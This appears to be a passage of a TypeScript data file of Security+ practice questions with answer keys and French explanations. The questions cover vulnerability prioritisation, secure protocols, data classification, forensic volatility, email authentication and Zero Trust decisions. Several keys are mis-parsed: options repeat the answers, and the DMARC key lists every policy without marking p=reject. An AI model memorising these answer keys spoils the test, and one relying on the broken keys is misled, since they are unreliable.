    "title": "Vulnerability Management Prioritization",
    "difficulty": "advanced",
    "timeLimitSeconds": 420,
    "role": "Security+ Candidate",
    "scenario": "You are a Vulnerability Management Analyst. The patch window is limited to two hours. Prioritize remediation from highest to lowest risk.\n\nFindings\nAsset\tCVSS\tExposure\tBusiness criticality\tExploit available\tData sensitivity\nA. Public VPN gateway\t8.1\tInternet-facing\tHigh\tYes\tMedium\nB. Internal workstation\t9.8\tInternal only\tLow\tYes\tLow\nC. Domain controller\t7.5\tInternal only\tCritical\tNo\tHigh\nD. Public marketing website\t6.8\tInternet-facing\tMedium\tNo\tPublic\nE. Database server\t6.4\tInternal only\tCritical\tYes\tHigh",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "PBQ2 local import",
    "skills": [
      "4.3",
      "5.2"
    ],
    "tasks": [
      {
        "id": "pbq2-scenario-007-task-1",
        "kind": "ordering",
        "title": "Vulnerability Management Prioritization",
        "prompt": "You are a Vulnerability Management Analyst. The patch window is limited to two hours. Prioritize remediation from highest to lowest risk.\n\nFindings\nAsset\tCVSS\tExposure\tBusiness criticality\tExploit available\tData sensitivity\nA. Public VPN gateway\t8.1\tInternet-facing\tHigh\tYes\tMedium\nB. Internal workstation\t9.8\tInternal only\tLow\tYes\tLow\nC. Domain controller\t7.5\tInternal only\tCritical\tNo\tHigh\nD. Public marketing website\t6.8\tInternet-facing\tMedium\tNo\tPublic\nE. Database server\t6.4\tInternal only\tCritical\tYes\tHigh",
        "options": [],
        "expectedAnswers": [
          "A. Public VPN gateway",
          "E. Database server",
          "C. Domain controller",
          "B. Internal workstation",
          "D. Public marketing website"
        ],
        "explanation": "Le VPN public avec exploit disponible est priorit\u00e9 maximale : exposition Internet + acc\u00e8s potentiel au r\u00e9seau.\nLa DB critique avec exploit disponible et donn\u00e9es sensibles passe devant une workstation m\u00eame si son CVSS est plus bas.\nLe Domain Controller est critique, mais pas d'exploit connu dans ce sc\u00e9nario.\nLa workstation a un CVSS tr\u00e8s \u00e9lev\u00e9, mais exposition et criticit\u00e9 plus faibles.\nLe site marketing est expos\u00e9, mais donn\u00e9es publiques, CVSS plus bas, pas d'exploit connu.",
        "traps": [
          "Ne pas classer uniquement par CVSS. \u00c0 l'examen, le risque d\u00e9pend de : exposition, criticit\u00e9, exploitabilit\u00e9, sensibilit\u00e9 des donn\u00e9es et impact m\u00e9tier."
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "pbq2-scenario-008",
    "domain": "Security Operations",
    "type": "scenario_tasks",
    "title": "Secure Protocol Replacement",
    "difficulty": "advanced",
    "timeLimitSeconds": 300,
    "role": "Security+ Candidate",
    "scenario": "A company audit found insecure protocols still in use. Match each insecure protocol to the BEST secure replacement.\n\nInsecure protocols\nTelnet\nFTP\nHTTP\nLDAP\nSNMPv2\nPOP3\nIMAP\nSyslog UDP\nSecure replacements\nSSH\nSFTP\nHTTPS\nLDAPS\nSNMPv3\nPOP3S\nIMAPS\nSyslog over TLS",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "PBQ2 local import",
    "skills": [
      "3.2",
      "4.5"
    ],
    "tasks": [
      {
        "id": "pbq2-scenario-008-task-1",
        "kind": "matching",
        "title": "Secure Protocol Replacement",
        "prompt": "A company audit found insecure protocols still in use. Match each insecure protocol to the BEST secure replacement.\n\nInsecure protocols\nTelnet\nFTP\nHTTP\nLDAP\nSNMPv2\nPOP3\nIMAP\nSyslog UDP\nSecure replacements\nSSH\nSFTP\nHTTPS\nLDAPS\nSNMPv3\nPOP3S\nIMAPS\nSyslog over TLS",
        "options": [
          "SSH",
          "SFTP",
          "HTTPS",
          "LDAPS",
          "SNMPv3",
          "POP3S",
          "IMAPS",
          "Syslog over TLS",
          "Insecure\tSecure alternative",
          "Telnet\tSSH",
          "FTP\tSFTP",
          "HTTP\tHTTPS",
          "LDAP\tLDAPS",
          "SNMPv2\tSNMPv3",
          "POP3\tPOP3S",
          "IMAP\tIMAPS",
          "Syslog UDP\tSyslog over TLS"
        ],
        "expectedAnswers": [
          "Insecure\tSecure alternative",
          "Telnet\tSSH",
          "FTP\tSFTP",
          "HTTP\tHTTPS",
          "LDAP\tLDAPS",
          "SNMPv2\tSNMPv3",
          "POP3\tPOP3S",
          "IMAP\tIMAPS",
          "Syslog UDP\tSyslog over TLS"
        ],
        "explanation": "PBQ 8 - Secure Protocol Replacement\nDomaine SY0-701\n\n4.5 - Secure protocols\n3.2 - Secure communication/access\n\nType d'interface\n\nMatching : protocole non s\u00e9curis\u00e9 \u2192 remplacement s\u00e9curis\u00e9.\n\nPrompt candidat\n\nA company audit found insecure protocols still in use. Match each insecure protocol to the BEST secure replacement.\n\nInsecure protocols\nTelnet\nFTP\nHTTP\nLDAP\nSNMPv2\nPOP3\nIMAP\nSyslog UDP\nSecure replacements\nSSH\nSFTP\nHTTPS\nLDAPS\nSNMPv3\nPOP3S\nIMAPS\nSyslog over TLS\nExpected answer\nInsecure\tSecure alternative\nTelnet\tSSH\nFTP\tSFTP\nHTTP\tHTTPS\nLDAP\tLDAPS\nSNMPv2\tSNMPv3\nPOP3\tPOP3S\nIMAP\tIMAPS\nSyslog UDP\tSyslog over TLS\nExtension r\u00e9aliste\n\nApr\u00e8s le matching, demander :\n\nWhich TWO insecure protocols should be blocked at the perimeter firewall first?\n\nChoix attendus :\n\nTelnet\nFTP\nPi\u00e8ges\nConfusion\tCorrection\nSFTP vs FTPS\tSFTP utilise SSH ; FTPS utilise TLS\nLDAP vs Kerberos\tLDAP interroge l'annuaire ; Kerberos authentifie\nSNMPv3 vs SNMPv2\tSNMPv3 ajoute auth/chiffrement\nSyslog UDP\tSouvent non chiffr\u00e9, pas fiable",
        "traps": [
          "Confusion\tCorrection",
          "SFTP vs FTPS\tSFTP utilise SSH ; FTPS utilise TLS",
          "LDAP vs Kerberos\tLDAP interroge l'annuaire ; Kerberos authentifie",
          "SNMPv3 vs SNMPv2\tSNMPv3 ajoute auth/chiffrement",
          "Syslog UDP\tSouvent non chiffr\u00e9, pas fiable"
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "pbq2-scenario-009",
    "domain": "Security Architecture",
    "type": "scenario_tasks",
    "title": "Data Protection / Classification / Encryption Level",
    "difficulty": "advanced",
    "timeLimitSeconds": 300,
    "role": "Security+ Candidate",
    "scenario": "You are a Data Security Analyst. Classify each data type and select the BEST protection method.\n\nData items\nID\tData\nD1\tPublic product brochure\nD2\tEmployee Social Insurance Numbers\nD3\tSource code for a proprietary payment application\nD4\tCustomer credit card numbers stored for recurring billing\nD5\tLaptop used by executives while traveling\nD6\tTest database used by developers with realistic customer structure but no real identities\nClassification options\nPublic\nInternal\nConfidential\nRestricted\nProtection options\nNo encryption required\nFull-disk encryption\nTokenization\nData masking\nFile-level encryption\nAccess control only",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "PBQ2 local import",
    "skills": [
      "1.4",
      "3.3"
    ],
    "tasks": [
      {
        "id": "pbq2-scenario-009-task-1",
        "kind": "classification",
        "title": "Data Protection / Classification / Encryption Level",
        "prompt": "You are a Data Security Analyst. Classify each data type and select the BEST protection method.\n\nData items\nID\tData\nD1\tPublic product brochure\nD2\tEmployee Social Insurance Numbers\nD3\tSource code for a proprietary payment application\nD4\tCustomer credit card numbers stored for recurring billing\nD5\tLaptop used by executives while traveling\nD6\tTest database used by developers with realistic customer structure but no real identities\nClassification options\nPublic\nInternal\nConfidential\nRestricted\nProtection options\nNo encryption required\nFull-disk encryption\nTokenization\nData masking\nFile-level encryption\nAccess control only",
        "options": [
          "Public",
          "Internal",
          "Confidential",
          "Restricted",
          "Protection options",
          "No encryption required",
          "Full-disk encryption",
          "Tokenization",
          "Data masking",
          "File-level encryption",
          "Access control only",
          "Data\tClassification\tProtection",
          "D1\tPublic\tNo encryption required",
          "D2\tRestricted\tFile-level or database encryption",
          "D3\tConfidential\tFile-level encryption / access control",
          "D4\tRestricted\tTokenization",
          "D5\tConfidential/Restricted depending data\tFull-disk encryption",
          "D6\tInternal/Confidential\tData masking"
        ],
        "expectedAnswers": [
          "Data\tClassification\tProtection",
          "D1\tPublic\tNo encryption required",
          "D2\tRestricted\tFile-level or database encryption",
          "D3\tConfidential\tFile-level encryption / access control",
          "D4\tRestricted\tTokenization",
          "D5\tConfidential/Restricted depending data\tFull-disk encryption",
          "D6\tInternal/Confidential\tData masking"
        ],
        "explanation": "PBQ 9 - Data Protection / Classification / Encryption Level\nDomaine SY0-701\n\n3.3 - Protect data\n1.4 - Cryptographic solutions\n\nType d'interface\n\nClasser donn\u00e9es + choisir protection.\n\nPrompt candidat\n\nYou are a Data Security Analyst. Classify each data type and select the BEST protection method.\n\nData items\nID\tData\nD1\tPublic product brochure\nD2\tEmployee Social Insurance Numbers\nD3\tSource code for a proprietary payment application\nD4\tCustomer credit card numbers stored for recurring billing\nD5\tLaptop used by executives while traveling\nD6\tTest database used by developers with realistic customer structure but no real identities\nClassification options\nPublic\nInternal\nConfidential\nRestricted\nProtection options\nNo encryption required\nFull-disk encryption\nTokenization\nData masking\nFile-level encryption\nAccess control only\nExpected answer\nData\tClassification\tProtection\nD1\tPublic\tNo encryption required\nD2\tRestricted\tFile-level or database encryption\nD3\tConfidential\tFile-level encryption / access control\nD4\tRestricted\tTokenization\nD5\tConfidential/Restricted depending data\tFull-disk encryption\nD6\tInternal/Confidential\tData masking\nPi\u00e8ges\nPi\u00e8ge\tPourquoi\nTokenization pour brochure publique\tInutile\nFull-disk encryption pour DB uniquement\tFDE prot\u00e8ge disque, pas usage applicatif pr\u00e9cis\nData masking vs encryption\tMasking garde format utilisable sans r\u00e9v\u00e9ler vraies donn\u00e9es\nCredit cards\tTokenization tr\u00e8s fr\u00e9quent",
        "traps": [
          "Pi\u00e8ge\tPourquoi",
          "Tokenization pour brochure publique\tInutile",
          "Full-disk encryption pour DB uniquement\tFDE prot\u00e8ge disque, pas usage applicatif pr\u00e9cis",
          "Data masking vs encryption\tMasking garde format utilisable sans r\u00e9v\u00e9ler vraies donn\u00e9es",
          "Credit cards\tTokenization tr\u00e8s fr\u00e9quent"
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "pbq2-scenario-010",
    "domain": "Security Operations",
    "type": "scenario_tasks",
    "title": "Order of Volatility / Digital Forensics",
    "difficulty": "advanced",
    "timeLimitSeconds": 420,
    "role": "Security+ Candidate",
    "scenario": "You are a Digital Forensics Analyst investigating a compromised workstation that is still powered on.\n\nArrange the evidence sources from most volatile to least volatile.\n\nItems\nCPU cache\nRAM\nNetwork connections\nRunning processes\nTemporary files\nDisk image\nArchived backups\nPrinted documentation",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "PBQ2 local import",
    "skills": [
      "4.8",
      "4.9"
    ],
    "tasks": [
      {
        "id": "pbq2-scenario-010-task-1",
        "kind": "ordering",
        "title": "Order of Volatility / Digital Forensics",
        "prompt": "You are a Digital Forensics Analyst investigating a compromised workstation that is still powered on.\n\nArrange the evidence sources from most volatile to least volatile.\n\nItems\nCPU cache\nRAM\nNetwork connections\nRunning processes\nTemporary files\nDisk image\nArchived backups\nPrinted documentation",
        "options": [],
        "expectedAnswers": [
          "CPU cache",
          "RAM",
          "Network connections",
          "Running processes",
          "Temporary files",
          "Disk image",
          "Archived backups",
          "Printed documentation"
        ],
        "explanation": "Le principe : collecter d'abord ce qui dispara\u00eet vite. Une machine allum\u00e9e contient des preuves volatiles : sessions r\u00e9seau, processus, m\u00e9moire. Le disque et les archives sont moins volatils.",
        "traps": [
          "Mauvais choix\tPourquoi",
          "Disk image en premier\tImportant, mais moins volatile que RAM/processus",
          "Reboot avant collecte\tPeut d\u00e9truire RAM et connexions",
          "Logs papier avant RAM\tMauvaise priorit\u00e9 forensic"
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "pbq2-scenario-011",
    "domain": "Security Operations",
    "type": "scenario_tasks",
    "title": "Email Security: SPF / DKIM / DMARC",
    "difficulty": "advanced",
    "timeLimitSeconds": 300,
    "role": "Security+ Candidate",
    "scenario": "You are an Email Security Administrator. The company wants to reduce spoofing and phishing.\n\nMatch each technology to its purpose and choose the correct DMARC action.\n\nTechnologies\nSPF\nDKIM\nDMARC\nMX\nPurposes\nLists authorized sending servers\nDigitally signs outbound mail\nDefines policy when SPF/DKIM fail\nIdentifies mail servers for a domain",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "PBQ2 local import",
    "skills": [
      "2.2",
      "4.5"
    ],
    "tasks": [
      {
        "id": "pbq2-scenario-011-task-1",
        "kind": "matching",
        "title": "Email Security: SPF / DKIM / DMARC",
        "prompt": "You are an Email Security Administrator. The company wants to reduce spoofing and phishing.\n\nMatch each technology to its purpose and choose the correct DMARC action.\n\nTechnologies\nSPF\nDKIM\nDMARC\nMX\nPurposes\nLists authorized sending servers\nDigitally signs outbound mail\nDefines policy when SPF/DKIM fail\nIdentifies mail servers for a domain",
        "options": [
          "SPF",
          "DKIM",
          "DMARC",
          "MX",
          "Purposes",
          "Lists authorized sending servers",
          "Digitally signs outbound mail",
          "Defines policy when SPF/DKIM fail",
          "Identifies mail servers for a domain",
          "Technology\tPurpose",
          "SPF\tLists authorized sending servers",
          "DKIM\tDigitally signs outbound mail",
          "DMARC\tDefines policy when SPF/DKIM fail",
          "MX\tIdentifies mail servers for a domain",
          "Scenario extension",
          "The organization wants failed emails to be rejected, not delivered to spam.",
          "Choose DMARC policy:",
          "p=none",
          "p=quarantine",
          "p=reject"
        ],
        "expectedAnswers": [
          "Technology\tPurpose",
          "SPF\tLists authorized sending servers",
          "DKIM\tDigitally signs outbound mail",
          "DMARC\tDefines policy when SPF/DKIM fail",
          "MX\tIdentifies mail servers for a domain",
          "Scenario extension",
          "The organization wants failed emails to be rejected, not delivered to spam.",
          "Choose DMARC policy:",
          "p=none",
          "p=quarantine",
          "p=reject",
          "Expected:"
        ],
        "explanation": "PBQ 11 - Email Security: SPF / DKIM / DMARC\nDomaine SY0-701\n\n4.5 - Email security\n2.2 - Message-based threat vectors\n\nType d'interface\n\nAssocier enregistrement DNS / fonction / r\u00e9sultat.\n\nPrompt candidat\n\nYou are an Email Security Administrator. The company wants to reduce spoofing and phishing.\n\nMatch each technology to its purpose and choose the correct DMARC action.\n\nTechnologies\nSPF\nDKIM\nDMARC\nMX\nPurposes\nLists authorized sending servers\nDigitally signs outbound mail\nDefines policy when SPF/DKIM fail\nIdentifies mail servers for a domain\nExpected matching\nTechnology\tPurpose\nSPF\tLists authorized sending servers\nDKIM\tDigitally signs outbound mail\nDMARC\tDefines policy when SPF/DKIM fail\nMX\tIdentifies mail servers for a domain\nScenario extension\n\nThe organization wants failed emails to be rejected, not delivered to spam.\n\nChoose DMARC policy:\n\np=none\np=quarantine\np=reject\n\nExpected:\n\np=reject\nPi\u00e8ges\nConfusion\tCorrection\nSPF vs DKIM\tSPF v\u00e9rifie serveur autoris\u00e9 ; DKIM v\u00e9rifie signature\nDMARC p=none\tSurveillance seulement\np=quarantine\tSpam/quarantine, pas rejet total\nMX\tSert au routage email, pas anti-spoofing",
        "traps": [
          "Confusion\tCorrection",
          "SPF vs DKIM\tSPF v\u00e9rifie serveur autoris\u00e9 ; DKIM v\u00e9rifie signature",
          "DMARC p=none\tSurveillance seulement",
          "p=quarantine\tSpam/quarantine, pas rejet total",
          "MX\tSert au routage email, pas anti-spoofing"
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "pbq2-scenario-012",
    "domain": "General Security Concepts",
    "type": "scenario_tasks",
    "title": "Zero Trust Access Decision",
    "difficulty": "advanced",
    "timeLimitSeconds": 420,
    "role": "Security+ Candidate",
    "scenario": "A company uses a Zero Trust architecture. Evaluate the following access requests and choose Allow, Step-up authentication, or Deny.\n\nPolicy\n\nAccess to the finance application is allowed only when:\n\nUser is in Finance group\nDevice is compliant\nMFA is successful\nLocation is approved or verified through step-up authentication\nRisk score must be Medium or lower\nRequests\nRequest\tUser group\tDevice\tMFA\tLocation\tRisk score\tDecision\nR1\tFinance\tCompliant\tSuccess\tApproved\tLow\t?\nR2\tFinance\tNon-compliant\tSuccess\tApproved\tLow\t?\nR3\tFinance\tCompliant\tSuccess\tNew country\tMedium\t?\nR4\tMarketing\tCompliant\tSuccess\tApproved\tLow\t?\nR5\tFinance\tCompliant\tFailed\tApproved\tLow\t?\nR6\tFinance\tCompliant\tSuccess\tApproved\tHigh\t?",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "PBQ2 local import",
    "skills": [
      "1.2",
      "4.6"
    ],
    "tasks": [
      {
        "id": "pbq2-scenario-012-task-1",
        "kind": "matrix",
        "title": "Zero Trust Access Decision",
        "prompt": "A company uses a Zero Trust architecture. Evaluate the following access requests and choose Allow, Step-up authentication, or Deny.\n\nPolicy\n\nAccess to the finance application is allowed only when:\n\nUser is in Finance group\nDevice is compliant\nMFA is successful\nLocation is approved or verified through step-up authentication\nRisk score must be Medium or lower\nRequests\nRequest\tUser group\tDevice\tMFA\tLocation\tRisk score\tDecision\nR1\tFinance\tCompliant\tSuccess\tApproved\tLow\t?\nR2\tFinance\tNon-compliant\tSuccess\tApproved\tLow\t?\nR3\tFinance\tCompliant\tSuccess\tNew country\tMedium\t?\nR4\tMarketing\tCompliant\tSuccess\tApproved\tLow\t?\nR5\tFinance\tCompliant\tFailed\tApproved\tLow\t?\nR6\tFinance\tCompliant\tSuccess\tApproved\tHigh\t?",
        "options": [],
        "expectedAnswers": [
          "Request\tDecision",
          "R1\tAllow",
          "R2\tDeny",
          "R3\tStep-up authentication",
          "R4\tDeny",
          "R5\tDeny",
          "R6\tDeny"
        ],
        "explanation": "Zero Trust ne fait pas confiance uniquement parce que l'utilisateur est \"interne\".\nLa posture appareil, le MFA, le contexte et le risque influencent la d\u00e9cision.\nUne localisation nouvelle mais risque medium peut d\u00e9clencher une authentification suppl\u00e9mentaire.\nUn device non conforme ou MFA \u00e9chou\u00e9 = deny.",
        "traps": [
          "Pi\u00e8ge\tPourquoi",
          "Allow car utilisateur Finance\tZero Trust exige aussi device/MFA/risk",
          "Step-up pour risk High\tTrop risqu\u00e9 : deny",
          "Allow Marketing car device conforme\tMauvais groupe"
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  }
] satisfies ScenarioTasksPBQ[];
